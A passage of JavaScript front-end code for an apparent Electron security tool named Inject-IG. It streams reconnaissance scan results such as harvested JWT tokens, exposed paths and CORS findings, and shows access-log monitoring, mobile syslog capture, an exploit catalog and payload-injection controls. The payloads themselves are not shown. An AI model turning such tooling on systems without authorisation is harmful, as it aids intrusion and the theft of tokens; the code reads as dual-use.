    subdomains:         { label: 'Subdomínios',           icon: ICONS.layers, color: 'amber' },
    redirect_chain:     { label: 'Cadeia de Redirects',   icon: ICONS.arrowRight, color: 'gray' },
    open_graph:         { label: 'Open Graph / Meta',     icon: ICONS.file, color: 'blue' },
    inline_scripts:     { label: 'Scripts Inline',        icon: ICONS.shieldAlert, color: 'amber' },
    dns:                { label: 'DNS',                   icon: ICONS.globe, color: 'gray' },
};

const TAG_COLORS = {
    red:   { bg: 'var(--red-muted)',   fg: 'var(--red)' },
    green: { bg: 'var(--green-muted)', fg: 'var(--green)' },
    amber: { bg: 'var(--amber-muted)', fg: 'var(--amber)' },
    blue:  { bg: 'var(--accent-muted)',fg: 'var(--accent)' },
    gray:  { bg: 'rgba(255,255,255,0.04)', fg: 'var(--text-3)' },
};

function renderModuleRows(data) {
    if (!data) return '';
    if (typeof data === 'string') return row('Valor', data);
    if (Array.isArray(data)) {
        if (data.length === 0) return row('Resultado', 'Nenhum', 'green');
        return data.map((item, i) => row(`#${i+1}`, typeof item === 'object' ? JSON.stringify(item) : item)).join('');
    }
    if (typeof data === 'object') {
        return Object.entries(data).map(([k, v]) => {
            let cls = '';
            if (v === 'AUSENTE' || v === false) cls = 'red';
            else if (v === true || v === 'OK') cls = 'green';
            const display = typeof v === 'object' ? JSON.stringify(v) : String(v);
            return row(k.replace(/_/g, ' '), display.length > 60 ? display.substring(0, 60) + '…' : display, cls);
        }).join('');
    }
    return row('Valor', String(data));
}

function getModuleBadge(moduleName, data) {
    if (moduleName === 'cors' && data?.open_cors) return { text: 'VULN', color: 'red' };
    if (moduleName === 'security_headers') {
        const missing = data ? Object.values(data).filter(v => v === 'AUSENTE').length : 0;
        if (missing > 3) return { text: `${missing} AUSENTES`, color: 'red' };
        if (missing > 0) return { text: `${missing} ausentes`, color: 'amber' };
        return { text: 'OK', color: 'green' };
    }
    if (moduleName === 'harvested_data') {
        const issues = (data?.jwt_tokens?.length || 0) + (data?.exposed_paths?.length || 0);
        if (issues > 0) return { text: `${issues} expostos`, color: 'red' };
        return { text: 'Limpo', color: 'green' };
    }
    if (Array.isArray(data)) return { text: data.length > 0 ? data.length + ' itens' : '—', color: data.length > 0 ? 'blue' : 'gray' };
    if (typeof data === 'object' && data !== null) return { text: Object.keys(data).length + ' campos', color: 'blue' };
    return { text: 'DATA', color: 'blue' };
}

function createModuleCard(moduleName, data, delay = 0) {
    const meta = MODULE_META[moduleName] || MODULE_META[moduleName.replace('deep_recon_', '')] || { label: moduleName, icon: ICONS.file, color: 'blue' };
    const actualData = data?.data || data?.result || data;
    const badge = getModuleBadge(moduleName.replace('deep_recon_', ''), actualData);
    const tc = TAG_COLORS[badge.color] || TAG_COLORS.blue;

    const card = document.createElement('div');
    card.className = 'module-card';
    card.style.animationDelay = `${delay}ms`;
    card.innerHTML = `
        <div class="module-header">
            <div class="module-header-left">
                <div class="module-dot" style="background: ${TAG_COLORS[meta.color]?.fg || 'var(--text-3)'}"></div>
                <span class="module-name">${meta.icon} ${meta.label}</span>
            </div>
            <span class="module-badge" style="background:${tc.bg};color:${tc.fg}">${badge.text}</span>
        </div>
        <div class="module-body">
            ${renderModuleRows(actualData)}
        </div>
    `;
    card.querySelector('.module-header').addEventListener('click', () => {
        card.querySelector('.module-body').classList.toggle('open');
    });
    return card;
}

function calcSecurityScore(allModules) {
    let score = 100;
    if (allModules.security_headers) {
        const missing = Object.values(allModules.security_headers).filter(v => v === 'AUSENTE').length;
        score -= missing * 5;
    }
    if (allModules.cors?.open_cors) score -= 15;
    const h = allModules.harvested_data || {};
    score -= (h.exposed_paths?.length || 0) * 8;
    score -= (h.jwt_tokens?.length || 0) * 15;
    return Math.max(0, Math.min(100, score));
}

function renderScoreBadge(score) {
    const color = score >= 80 ? 'var(--green)' : score >= 50 ? 'var(--amber)' : 'var(--red)';
    const label = score >= 80 ? 'Seguro' : score >= 50 ? 'Atenção' : 'Crítico';
    return `<div class="score-badge">
        <div class="score-ring" style="--score-color: ${color}; --score-pct: ${score}%; color: ${color};">
            <span>${score}</span>
        </div>
        <div class="score-meta">
            <span class="score-label">${label}</span>
            <span class="score-sublabel">Score de segurança</span>
        </div>
    </div>`;
}

// ═══════════ Scan Handlers ═══════════
document.getElementById('btn-run-scan')?.addEventListener('click', async () => {
    const urlInput = document.getElementById('scan-target');
    let url = urlInput.value.trim();
    if (!url) return;
    if (!/^https?:\/\//i.test(url)) url = 'https://' + url;

    const progressBar = document.getElementById('scan-progress');
    const progressFill = document.getElementById('scan-progress-fill');
    const scoreArea = document.getElementById('scan-score-area');
    const statusArea = document.getElementById('scan-status-area');

    vaultResults.innerHTML = '';
    scoreArea.innerHTML = '';
    progressBar.classList.add('active');
    progressFill.style.width = '0%';
    statusArea.innerHTML = '<div class="scan-status"><div class="scan-status-dot"></div>Conectando ao Core...</div>';

    try {
        // Health check
        const health = await fetch(SERVER_URL + '/api/inject-ig/status', { signal: AbortSignal.timeout(3000) });
        if (!health.ok) throw new Error('Core offline');

        const streamUrl = `${SERVER_URL}/api/inject-ig/scan-stream?url=${encodeURIComponent(url)}`;
        const eventSource = new EventSource(streamUrl);
        const allModules = {};
        let moduleCount = 0;

        const handleEvent = (payload) => {
            const m = payload.module;
            if (!m) return;
            allModules[m] = payload.result;
            currentVaultData[m] = payload.result;
            currentVaultData.target = url;
            moduleCount++;

            progressFill.style.width = Math.round(((payload.step || 0) / (payload.total || 25)) * 100) + '%';
            const meta = MODULE_META[m] || MODULE_META[m.replace('deep_recon_', '')] || { label: m, icon: '📄' };
            statusArea.innerHTML = `<div class="scan-status"><div class="scan-status-dot"></div>${meta.icon} ${meta.label} — ${payload.step || 0}/${payload.total || 25}</div>`;
            
            const card = createModuleCard(m, payload.result, 0);
            vaultResults.appendChild(card);
            vaultResults.scrollTop = vaultResults.scrollHeight;
            
            const score = calcSecurityScore(allModules);
            scoreArea.innerHTML = renderScoreBadge(score);
            
            // Updates dinâmicos em tempo real nas abas
            renderFileTree(currentVaultData);
            updateReportSummary(currentVaultData);
        };

        // Standard message listener
        eventSource.onmessage = (e) => { try { handleEvent(JSON.parse(e.data)); } catch (err) {} };

        // Named event listeners (Backend uses .name(moduleName))
        Object.keys(MODULE_META).forEach(name => {
            const register = (eventName) => {
                eventSource.addEventListener(eventName, (e) => {
                    try { handleEvent(JSON.parse(e.data)); } catch (err) {}
                });
            };
            register(name);
            register('deep_recon_' + name);
        });

        eventSource.addEventListener('architecture', (e) => { try { handleEvent(JSON.parse(e.data)); } catch (err) {} });
        eventSource.addEventListener('harvested_data', (e) => { try { handleEvent(JSON.parse(e.data)); } catch (err) {} });

        eventSource.addEventListener('copilot_alert', (e) => {
            try {
                const payload = JSON.parse(e.data);
                const alertMsg = payload.result || payload;
                const isCritical = alertMsg.includes('CRÍTICO') || alertMsg.includes('Alta exposição');
                
                if (isCritical) {
                    RendererAudioEngine.playAlert();
                    document.querySelector('.app').classList.add('critical-alert');
                    setTimeout(() => document.querySelector('.app').classList.remove('critical-alert'), 3000);
                    
                    term.writeln(`\r\n\x1b[35m[AI Copilot]\x1b[0m \x1b[31;1m${alertMsg}\x1b[0m`);
                } else {
                    term.writeln(`\r\n\x1b[35m[AI Copilot]\x1b[0m \x1b[33m${alertMsg}\x1b[0m`);
                }
            } catch (err) {}
        });

        eventSource.addEventListener('done', () => {
            eventSource.close();
            statusArea.innerHTML = '<div class="scan-status" style="color:var(--green)">✅ Scan completo — ' + moduleCount + ' módulos</div>';
            progressFill.style.width = '100%';
            setTimeout(() => { if (progressBar) progressBar.classList.remove('active'); }, 1500);
            renderFileTree(currentVaultData);
        });

        eventSource.addEventListener('error', (e) => {
            if (moduleCount === 0) {
                eventSource.close();
                if (progressBar) progressBar.classList.remove('active');
                statusArea.innerHTML = '<div class="scan-status" style="color:var(--red)">❌ Erro de conexão ou timeout</div>';
            }
        });
    } catch (err) {
        progressBar.classList.remove('active');
        const platform = navigator.platform || 'desconhecido';
        statusArea.innerHTML = `<div class="scan-status" style="color:var(--red)">❌ Core Engine offline — Verifique se o Java está instalado (java -version no terminal)</div>`;
        term.writeln(`\r\n\x1b[31m[CORE OFFLINE]\x1b[0m ${err.message}`);
        term.writeln(`\x1b[33m[dica]\x1b[0m Certifique-se que o Java 21+ está instalado e no PATH.`);
        term.prompt();
    }
});

document.getElementById('btn-run-scan-local')?.addEventListener('click', async () => {
    try {
        const folderPath = await window.electronAPI.selectScanFolder();
        if (!folderPath) return;
        vaultResults.innerHTML = '<div style="text-align:center;padding:20px;font-size:10px;">Varrendo local...</div>';
        const res = await fetch(SERVER_URL + '/api/inject-ig/scan-local', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ path: folderPath })
        });
        const data = await res.json();
        currentVaultData = data;
        vaultResults.innerHTML = '<div class="tag tag-green">Local: ' + folderPath + '</div>';
        renderFileTree(data);
    } catch (e) {
        vaultResults.innerHTML = '<div style="color:var(--red);padding:20px;">Erro local</div>';
    }
});

// ═══════════ File Tree & Downloads ═══════════
function downloadData(filename, content) {
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = filename; a.click();
    URL.revokeObjectURL(url);
}

function renderFileTree(data) {
    const pane = document.getElementById('pane-files');
    const mainList = document.getElementById('main-files-list');
    if (!pane || !mainList) return;
    mainList.innerHTML = '';
    
    const COLORS_MAP = { red: 'var(--red)', amber: 'var(--amber)', blue: 'var(--accent)', green: 'var(--green)', gray: 'var(--text-3)' };
    const allItems = [];

    const addFolder = (title, items, color) => {
        if (!items || items.length === 0) return;
        const f = document.createElement('div');
        f.className = 'folder';
        f.innerHTML = `<div class="folder-dot" style="background:${COLORS_MAP[color]}"></div><span>${title} <span style="color:var(--text-3)">${items.length}</span></span>`;
        const c = document.createElement('div');
        c.className = 'folder-children';
        items.forEach(item => {
            const val = typeof item === 'object' ? JSON.stringify(item) : String(item);
            const el = document.createElement('div');
            el.className = 'folder-child'; el.textContent = val;
            c.appendChild(el);
            allItems.push({ title, val, color });
        });
        f.onclick = () => c.classList.toggle('open');
        mainList.appendChild(f); mainList.appendChild(c);
    };

    const h = data.harvested_data || {};
    const dr = data.deep_recon || data || {};
    addFolder('Arquivos Críticos', h.exposed_paths || data.exposed_paths, 'red');
    addFolder('Endpoints', data.architecture?.form_endpoints, 'blue');
    addFolder('Scripts', data.architecture?.scripts, 'gray');
    addFolder('Links', data.architecture?.links, 'gray');
    addFolder('Sociais', dr.social_links, 'blue');
    addFolder('Telefones', dr.phone_numbers, 'green');

    allItems.forEach(item => {
        const row = document.createElement('div');
        row.className = 'row';
        row.style.padding = '8px 12px';
        row.innerHTML = `
            <div style="display:flex;align-items:center;gap:10px;flex:1;overflow:hidden;">
                <div style="width:6px;height:6px;border-radius:50%;background:${COLORS_MAP[item.color]};flex-shrink:0;"></div>
                <div style="color:var(--text-3);min-width:80px;">${item.title}</div>
                <div style="color:var(--text-1);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${item.val}</div>
            </div>
            <button class="btn btn-ghost" style="width:auto;padding:2px 8px;font-size:9px;">Baixar</button>
        `;
        row.querySelector('button').onclick = () => downloadData(`${item.title}.txt`, item.val);
        mainList.appendChild(row);
    });
    updateReportSummary(data);
}

function updateReportSummary(data) {
    const s = document.getElementById('report-summary-content');
    if (!s || !data.target) return;
    const score = calcSecurityScore(data);
    
    // Calcula contagens para o relatório
    let vulnsCount = 0;
    let headersCount = 0;
    let cookiesCount = 0;
    let techCount = 0;

    if (data.harvested_data) {
        if (data.harvested_data.emails) vulnsCount += data.harvested_data.emails.length;
        if (data.harvested_data.keys) vulnsCount += data.harvested_data.keys.length;
    }
    
    if (data.security_headers) headersCount = Object.keys(data.security_headers).length;
    if (data.cookies) cookiesCount = Array.isArray(data.cookies) ? data.cookies.length : Object.keys(data.cookies).length;
    if (data.tech_stack) techCount = Array.isArray(data.tech_stack) ? data.tech_stack.length : Object.keys(data.tech_stack).length;

    const scoreColor = score === 'A+' || score === 'A' ? 'var(--green)' : 
                       score === 'B' || score === 'C' ? 'var(--amber)' : 'var(--red)';

    s.innerHTML = `
        <div style="margin-bottom: 20px;">
            <div style="font-size: 11px; color: var(--text-3); margin-bottom: 4px;">Alvo Auditado</div>
            <div style="font-size: 14px; font-weight: 600; color: var(--text-1); word-break: break-all;">${data.target}</div>
        </div>

        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px;">
            <div class="card" style="padding: 15px; text-align: center; border-color: ${scoreColor}40;">
                <div style="font-size: 10px; color: var(--text-3); margin-bottom: 8px;">Security Score</div>
                <div style="font-size: 32px; font-weight: 800; color: ${scoreColor}; font-family: var(--mono); text-shadow: 0 0 10px ${scoreColor}40;">
                    ${score}
                </div>
            </div>
            <div class="card" style="padding: 15px; display: flex; flex-direction: column; justify-content: center; gap: 8px;">
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <span style="font-size: 11px; color: var(--text-3);">Módulos Ativos</span>
                    <span class="tag tag-blue">${Object.keys(data).length - 1}</span>
                </div>
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <span style="font-size: 11px; color: var(--text-3);">Status</span>
                    <span class="tag tag-green">Finalizado</span>
                </div>
            </div>
        </div>

        <div style="font-size: 11px; font-weight: 600; color: var(--text-2); margin-bottom: 10px; padding-bottom: 5px; border-bottom: 1px solid var(--border);">
            Métricas de Reconhecimento
        </div>

        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
            <div class="row">
                <span class="row-k">Exposições (Vulns)</span>
                <span class="row-v" style="color: ${vulnsCount > 0 ? 'var(--red)' : 'var(--text-2)'}">${vulnsCount}</span>
            </div>
            <div class="row">
                <span class="row-k">Headers Seguros</span>
                <span class="row-v" style="color: var(--green)">${headersCount}</span>
            </div>
            <div class="row">
                <span class="row-k">Cookies</span>
                <span class="row-v" style="color: var(--amber)">${cookiesCount}</span>
            </div>
            <div class="row">
                <span class="row-k">Stack Tecnológica</span>
                <span class="row-v" style="color: var(--blue)">${techCount}</span>
            </div>
        </div>
    `;
}

// ═══════════ Exports ═══════════
document.getElementById('export-json')?.addEventListener('click', () => {
    if (!currentVaultData.target) return alert('Sem dados');
    downloadData('report.json', JSON.stringify(currentVaultData, null, 2));
});

document.getElementById('export-pdf')?.addEventListener('click', () => {
    if (!currentVaultData.target) return alert('Sem dados');
    const { jsPDF } = window.jspdf;
    const doc = new jsPDF();
    doc.text(`Relatório de Auditoria - Inject-IG`, 10, 10);
    doc.text(`Alvo: ${currentVaultData.target}`, 10, 20);
    doc.save('relatorio.pdf');
});

// ═══════════ Monitor (Live Poll & Topology & TimeTravel) ═══════════
const statusDot = document.getElementById('core-status-dot');
const statusLabel = document.getElementById('core-status-label');
const statusDetail = document.getElementById('core-status-detail');
const vaultHistory = document.getElementById('vault-history');
const accessCount = document.getElementById('access-count');
const liveFeed = document.getElementById('live-feed');
const timeTravelSlider = document.getElementById('time-travel-slider');
const timeTravelLabel = document.getElementById('time-travel-label');
const canvas = document.getElementById('network-canvas');
const ctx = canvas ? canvas.getContext('2d') : null;

let coreOnline = false;
let allAccessLogs = [];
let timeTravelMax = 0;

// Topologia Canvas State
let nodes = [{ x: 150, y: 60, r: 8, color: 'var(--blue)', isCenter: true }];
let pulses = [];

function resizeCanvas() {
    if (!canvas || !canvas.parentElement) return;
    const rect = canvas.parentElement.getBoundingClientRect();
    if (rect.width > 0 && rect.height > 0) {
        canvas.width = rect.width;
        canvas.height = rect.height;
        if (nodes.length > 0) {
            nodes[0].x = rect.width / 2;
            nodes[0].y = rect.height / 2;
        }
    }
}

if (canvas) {
    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();
    
    function drawTopology() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        // Draw Lines
        ctx.strokeStyle = 'rgba(59, 130, 246, 0.2)';
        ctx.lineWidth = 1;
        nodes.forEach((node, i) => {
            if (!node.isCenter) {
                ctx.beginPath();
                ctx.moveTo(nodes[0].x, nodes[0].y);
                ctx.lineTo(node.x, node.y);
                ctx.stroke();
            }
        });
        
        // Draw Pulses
        pulses.forEach((p, i) => {
            p.progress += 0.05;
            if (p.progress >= 1) {
                pulses.splice(i, 1);
                return;
            }
            const cx = nodes[0].x + (p.target.x - nodes[0].x) * p.progress;
            const cy = nodes[0].y + (p.target.y - nodes[0].y) * p.progress;
            ctx.beginPath();
            ctx.arc(cx, cy, 3, 0, Math.PI * 2);
            ctx.fillStyle = '#ef4444';
            ctx.shadowBlur = 10;
            ctx.shadowColor = '#ef4444';
            ctx.fill();
            ctx.shadowBlur = 0;
        });
        
        // Draw Nodes
        nodes.forEach(node => {
            ctx.beginPath();
            ctx.arc(node.x, node.y, node.r, 0, Math.PI * 2);
            ctx.fillStyle = node.color;
            ctx.fill();
        });
        
        requestAnimationFrame(drawTopology);
    }
    drawTopology();
}

const updateLiveFeedUI = (logsToShow) => {
    accessCount.textContent = logsToShow.length;
    if (logsToShow.length) {
        liveFeed.innerHTML = logsToShow.slice(-10).reverse().map(l => {
            const urlShort = l.target.length > 25 ? l.target.substring(0,25) + '...' : l.target;
            const detail = l.keys && l.keys !== 'NONE' ? l.keys : urlShort;
            return `<div class="row" style="flex-direction: column; align-items: flex-start; gap: 4px;">
                        <div style="display:flex; justify-content:space-between; width: 100%;">
                            <span class="row-k" style="color:var(--blue)">${urlShort}</span>
                            <span class="row-v">${new Date(+l.time).toLocaleTimeString()}</span>
                        </div>
                        <span style="font-size: 9px; color: var(--text-3); font-family: var(--mono);">${detail}</span>
                    </div>`;
        }).join('');
    } else {
        liveFeed.innerHTML = '<div style="text-align: center; color: var(--text-3); font-size: 10px; padding: 10px 0;">Nenhum acesso</div>';
    }
};

if (timeTravelSlider) {
    timeTravelSlider.addEventListener('input', (e) => {
        const val = parseInt(e.target.value, 10);
        if (val >= allAccessLogs.length) {
            timeTravelLabel.textContent = 'Ao Vivo';
            updateLiveFeedUI(allAccessLogs);
        } else {
            const logDate = new Date(+allAccessLogs[val].time).toLocaleTimeString();
            timeTravelLabel.textContent = `Em: ${logDate}`;
            updateLiveFeedUI(allAccessLogs.slice(0, val + 1));
            // Glitch visual para indicar retrocesso
            document.querySelector('.app').classList.add('critical-alert');
            setTimeout(() => document.querySelector('.app').classList.remove('critical-alert'), 200);
        }
    });
}

const monitorPoll = async () => {
    try {
        const r = await fetch(SERVER_URL + '/api/inject-ig/status');
        if (r.ok) {
            const data = await r.json();
            coreOnline = true;
            statusDot.style.background = 'var(--green)';
            statusLabel.className = 'tag tag-green';
            statusLabel.textContent = 'Online';
            
            // Telemetry UI Updates
            if (data.memory_used && data.memory_max) {
                const memUsedMb = (data.memory_used / 1024 / 1024).toFixed(1);
                const memMaxMb = (data.memory_max / 1024 / 1024).toFixed(1);
                const memPercent = Math.min(100, Math.round((data.memory_used / data.memory_max) * 100));
                
                const ramLabel = document.getElementById('telemetry-ram-label');
                const ramBar = document.getElementById('telemetry-ram-bar');
                if (ramLabel) ramLabel.textContent = `${memUsedMb} MB / ${memMaxMb} MB`;
                if (ramBar) {
                    ramBar.style.width = `${memPercent}%`;
                    ramBar.style.background = memPercent > 85 ? 'var(--red)' : (memPercent > 60 ? 'var(--yellow)' : 'var(--accent)');
                }
            }
            if (data.active_threads !== undefined) {
                const thEl = document.getElementById('telemetry-threads');
                if (thEl) thEl.textContent = data.active_threads;
            }
            if (data.active_sessions !== undefined) {
                const vEl = document.getElementById('telemetry-vault');
                if (vEl) vEl.textContent = data.active_sessions;
            }
            if (data.total_intercepts !== undefined) {
                const intEl = document.getElementById('telemetry-intercepts');
                if (intEl) intEl.textContent = data.total_intercepts;
            }
        }
    } catch {
        coreOnline = false;
        statusDot.style.background = 'var(--red)';
        statusLabel.className = 'tag tag-red';
        statusLabel.textContent = 'Offline';
    }

    if (!coreOnline) return;

    try {
        const r = await fetch(SERVER_URL + '/api/inject-ig/monitor', { signal: AbortSignal.timeout(2000) });
        const m = await r.json();
        
        const vk = Object.keys(m.vault || {});
        vaultHistory.innerHTML = vk.length ? vk.map(k => `<div class="row"><span class="row-v">${k}</span></div>`).join('') : 'Nenhum scan';
        
        const newLogs = m.access_logs || [];
        if (newLogs.length > allAccessLogs.length) {
            // New items detected
            const diff = newLogs.length - allAccessLogs.length;
            for(let i=0; i<diff; i++) {
                // Spawn new node and pulse in canvas
                if (canvas && nodes.length < 30) {
                    const newNode = {
                        x: Math.random() * (canvas.width - 40) + 20,
                        y: Math.random() * (canvas.height - 40) + 20,
                        r: 4,
                        color: 'var(--red)'
                    };
                    nodes.push(newNode);
                    pulses.push({ target: newNode, progress: 0 });
                } else if (canvas) {
                    // Send a pulse to a random existing node if max reached
                    const randNode = nodes[Math.floor(Math.random() * (nodes.length - 1)) + 1];
                    if (randNode) pulses.push({ target: randNode, progress: 0 });
                }
            }
        }
        allAccessLogs = newLogs;
        if (timeTravelSlider) {
            timeTravelSlider.max = Math.max(0, allAccessLogs.length - 1);
            if (timeTravelLabel.textContent === 'Ao Vivo') {
                timeTravelSlider.value = timeTravelSlider.max;
                updateLiveFeedUI(allAccessLogs);
            }
        }
    } catch {}
};

setInterval(monitorPoll, 1000);
setTimeout(monitorPoll, 500);

// ═══════════ Terminal IO ═══════════
window.electronAPI.onTerminalData((data) => {
    data.split('\n').forEach((l, i) => {
        if (i > 0) term.write('\r\n');
        term.write(l.replace(/\r/g, ''));
    });
});

// ═══════════ Window Controls ═══════════
document.getElementById('btn-close')?.addEventListener('click', () => window.electronAPI.closeWindow());
document.getElementById('btn-minimize')?.addEventListener('click', () => window.electronAPI.minimizeWindow());
document.getElementById('btn-maximize')?.addEventListener('click', () => window.electronAPI.maximizeWindow());

// Window Controls (Auth View)
document.getElementById('btn-auth-close')?.addEventListener('click', () => window.electronAPI.closeWindow());
document.getElementById('btn-auth-minimize')?.addEventListener('click', () => window.electronAPI.minimizeWindow());
document.getElementById('btn-auth-maximize')?.addEventListener('click', () => window.electronAPI.maximizeWindow());

document.getElementById('btn-start-core')?.addEventListener('click', () => {
    term.writeln('\r\n[sys] Iniciando Core...');
    window.electronAPI.sendTerminalKeystroke('cd core-engine && ./mvnw spring-boot:run');
});
document.getElementById('btn-inject-local')?.addEventListener('click', async () => {
    const p = await window.electronAPI.selectLocalTargetFolder();
    if (p) window.electronAPI.injectPayloadLocal(p);
});

document.getElementById('tool-search')?.addEventListener('input', (e) => renderTools(e.target.value));
document.getElementById('exploit-search')?.addEventListener('input', (e) => renderExploits(e.target.value));

setTimeout(() => {
    fitAddon.fit();
    renderTerminalCommands();
    renderTools();
    renderExploits();
    showSubPaneExploits('tab-exploits-catalog');
    showSubPane('tab-data');
}, 100);

// ═══════════ Settings Panel Logic ═══════════
const rootStyle = document.documentElement.style;

function setGraphicsLevel(level) {
    // level: 'low', 'medium', 'ultra'
    
    // Update active button state
    document.getElementById('gfx-low')?.classList.remove('active');
    document.getElementById('gfx-medium')?.classList.remove('active');
    document.getElementById('gfx-ultra')?.classList.remove('active');
    document.getElementById('gfx-' + level)?.classList.add('active');
    
    // Update descriptions
    document.getElementById('gfx-desc-low').style.display = level === 'low' ? 'block' : 'none';
    document.getElementById('gfx-desc-medium').style.display = level === 'medium' ? 'block' : 'none';
    document.getElementById('gfx-desc-ultra').style.display = level === 'ultra' ? 'block' : 'none';
    
    // Apply body classes
    document.body.classList.remove('graphics-low', 'graphics-medium', 'graphics-ultra');
    document.body.classList.add('graphics-' + level);
    
    // Save to localStorage
    localStorage.setItem('inject-ig-graphics', level);
    
    // Terminal glow update
    if (term && term.element) {
        if (level === 'ultra') {
            term.element.classList.add('glow-text');
        } else {
            term.element.classList.remove('glow-text');
        }
    }
}

document.getElementById('gfx-low')?.addEventListener('click', () => setGraphicsLevel('low'));
document.getElementById('gfx-medium')?.addEventListener('click', () => setGraphicsLevel('medium'));
document.getElementById('gfx-ultra')?.addEventListener('click', () => setGraphicsLevel('ultra'));

// Initialize default state from localStorage
const savedGfx = localStorage.getItem('inject-ig-graphics') || 'medium';
setGraphicsLevel(savedGfx);

// Key Injection Logic
const keyInjBtns = ['key-inj-hook', 'key-inj-dom', 'key-inj-proto'];
keyInjBtns.forEach(id => {
    document.getElementById(id)?.addEventListener('click', (e) => {
        keyInjBtns.forEach(btn => document.getElementById(btn).classList.remove('active'));
        e.target.classList.add('active');
        term.writeln(`\r\n\x1b[32m[config]\x1b[0m Injeção ajustada para: ${e.target.innerText}`);
        term.prompt();
    });
});

// ═══════════ Mobile Deployment Logic ═══════════
let selectedUsbDevice = null;
let selectedPlatform = null;
let mobileLogAutoScroll = true;
const terminalDiv = document.getElementById('mobile-log-terminal');

async function scanUsbDevices() {
    const select = document.getElementById('mobile-device-select');
    const startBtn = document.getElementById('btn-start-mobile-log');
    
    if(!select) return;
    select.innerHTML = '<option value="">Buscando dispositivos...</option>';
    if(startBtn) startBtn.disabled = true;
    
    const res = await window.electronAPI.getMobileDevices();
    select.innerHTML = '';
    
    if (res.success && res.devices && res.devices.length > 0) {
        res.devices.forEach(device => {
            const opt = document.createElement('option');
            opt.value = device.id;
            opt.dataset.platform = device.platform;
            opt.innerText = device.name || device.id;
            select.appendChild(opt);
        });
        if(startBtn) startBtn.disabled = false;
    } else {
        select.innerHTML = '<option value="">Nenhum dispositivo detectado</option>';
    }
}

document.getElementById('btn-scan-devices')?.addEventListener('click', scanUsbDevices);

document.getElementById('btn-start-mobile-log')?.addEventListener('click', async () => {
    const select = document.getElementById('mobile-device-select');
    if (!select.value) return;
    
    const deviceId = select.value;
    const platform = select.selectedOptions[0].dataset.platform;
    
    document.getElementById('btn-start-mobile-log').style.display = 'none';
    document.getElementById('btn-stop-mobile-log').style.display = 'block';
    
    terminalDiv.innerHTML = '<span style="color: var(--text-3);">[SYSTEM] Conectando ao serviço de log do ' + platform + '...</span>\n';
    
    // ── Log Buffering & Optimization ──
    window.mobileLogBuffers = { all: [], error: [], warn: [], app: [] };
    window.currentLogTab = 'all';
    const MAX_LOG_LINES = 800; // Limit to prevent lag
    
    // Tab switching listener
    document.querySelectorAll('[data-log-tab]').forEach(tab => {
        tab.addEventListener('click', (e) => {
            document.querySelectorAll('[data-log-tab]').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            window.currentLogTab = tab.getAttribute('data-log-tab');
            
            // Immediate redraw
            terminalDiv.innerHTML = window.mobileLogBuffers[window.currentLogTab].join('');
            if (mobileLogAutoScroll) terminalDiv.scrollTop = terminalDiv.scrollHeight;
        });
    });

    // Flushing interval
    if (window.mobileLogInterval) clearInterval(window.mobileLogInterval);
    window.mobileLogInterval = setInterval(() => {
        if (!document.getElementById('view-mobile').classList.contains('active')) return;
        
        terminalDiv.innerHTML = window.mobileLogBuffers[window.currentLogTab].join('');
        if (mobileLogAutoScroll) terminalDiv.scrollTop = terminalDiv.scrollHeight;
    }, 500);

    window.electronAPI.onMobileSyslog((data) => {
        // Classify the log
        const dLower = data.toLowerCase();
        let isError = data.includes(' E ') || data.includes(' F ') || dLower.includes('error') || dLower.includes('fatal') || dLower.includes('exception');
        let isWarn = data.includes(' W ') || dLower.includes('warning') || dLower.includes('warn ');
        // App logs often don't contain common OS native tags, or they contain package names. We'll use a simple heuristic:
        // Exclude common noise tags like ActivityManager, system_server, kernel, etc.
        let isApp = !dLower.includes('system_server') && !dLower.includes('activitymanager') && !dLower.includes('kernel') && !dLower.includes('surfaceflinger');

        let color = 'var(--text-2)';
        if (isError) color = 'var(--red)';
        else if (isWarn) color = 'var(--accent)';
        
        const lineHtml = `<span style="color: ${color};">${data.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</span>\n`;
        
        // Push to All
        window.mobileLogBuffers.all.push(lineHtml);
        if (window.mobileLogBuffers.all.length > MAX_LOG_LINES) window.mobileLogBuffers.all.shift();
        
        if (isError) {
            window.mobileLogBuffers.error.push(lineHtml);
            if (window.mobileLogBuffers.error.length > MAX_LOG_LINES) window.mobileLogBuffers.error.shift();
        }
        if (isWarn) {
            window.mobileLogBuffers.warn.push(lineHtml);
            if (window.mobileLogBuffers.warn.length > MAX_LOG_LINES) window.mobileLogBuffers.warn.shift();
        }
        if (isApp && !isError && !isWarn) { // only pure app logs or include all app logs? We'll include all app logs
            window.mobileLogBuffers.app.push(lineHtml);
            if (window.mobileLogBuffers.app.length > MAX_LOG_LINES) window.mobileLogBuffers.app.shift();
        }
    });
    
    const res = await window.electronAPI.startSyslog(deviceId, platform);
    if (!res.success) {
        window.mobileLogBuffers.all.push(`\n<span style="color: var(--red);">[ERRO FATAL] ${res.message}</span>\n`);
        document.getElementById('btn-stop-mobile-log').click();
    }
});

document.getElementById('btn-stop-mobile-log')?.addEventListener('click', async () => {
    await window.electronAPI.stopSyslog();
    window.electronAPI.offMobileSyslog();
    
    document.getElementById('btn-start-mobile-log').style.display = 'block';
    document.getElementById('btn-stop-mobile-log').style.display = 'none';
    
    window.mobileLogBuffers.all.push('\n<span style="color: var(--text-3);">[SYSTEM] Captura interrompida pelo usuário.</span>\n');
    terminalDiv.innerHTML = window.mobileLogBuffers[window.currentLogTab].join('');
    if (mobileLogAutoScroll) terminalDiv.scrollTop = terminalDiv.scrollHeight;
});

document.getElementById('btn-clear-mobile-log')?.addEventListener('click', () => {
    window.mobileLogBuffers = { all: [], error: [], warn: [], app: [] };
    terminalDiv.innerHTML = '';
});

// Auto-scroll toggle feature: if user scrolls up, disable auto-scroll
terminalDiv?.addEventListener('scroll', () => {
    const isAtBottom = terminalDiv.scrollHeight - terminalDiv.scrollTop <= terminalDiv.clientHeight + 10;
    mobileLogAutoScroll = isAtBottom;
});


// ═══════════ ESPETOR (WebSocket Stream) ═══════════
let spectreWs = null;

